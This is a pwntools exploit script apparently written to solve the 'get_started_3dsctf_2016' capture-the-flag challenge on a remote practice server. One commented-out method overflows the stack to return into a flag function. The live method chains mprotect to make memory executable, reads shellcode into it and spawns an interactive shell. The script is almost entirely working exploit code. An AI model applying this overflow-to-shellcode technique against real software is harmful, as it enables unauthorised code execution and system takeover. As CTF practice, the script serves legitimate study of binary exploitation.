from pwn import *

# node3.buuoj.cn:26417

# context.log_level = "debug"
context.os = "linux"
context.arch = "i386"

elf = ELF("get_started_3dsctf_2016")

get_flag_addr = 0x80489a0
# used to change the excution authority of stack area
mprotect = 0x806ec80
skip_addr = 0x80489b8

# exit
exit_addr = 0x804e6a0

if args.LOCAL:
    p = process("./get_started_3dsctf_2016")
else:
    p = remote("node3.buuoj.cn", 28152)
# print(p.recv())
# p.recvuntil("Qual a palavrinha magica? ")

# ========== method 1 =================
# payload = b'a'*(0x38)+p32(get_flag_addr)+p32(exit_addr) + p32(0x308cd64f) + p32(0x195719d1)
# # payload = b'a'*(0x38)+p32(skip_addr)
# p.sendline(payload)
# =====================================

# ========== method 2 =================
main_addr = 0x8048a20
shellcode_addr = 0x80eb000
length = 1000
rwx = 7
mpro = elf.symbols['mprotect']
read = elf.symbols['read']

payload1 = b'a'*0x38+p32(mpro)+p32(main_addr)+p32(shellcode_addr)+p32(length)+p32(rwx)
p.sendline(payload1)

# p.recvuntil("Qual a palavrinha magica? ")

payload2 = b'a'*0x38 + p32(read) + p32(shellcode_addr) + p32(0) + p32(shellcode_addr) + p32(100)
p.sendline(payload2)

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
# =====================================

p.interactive()
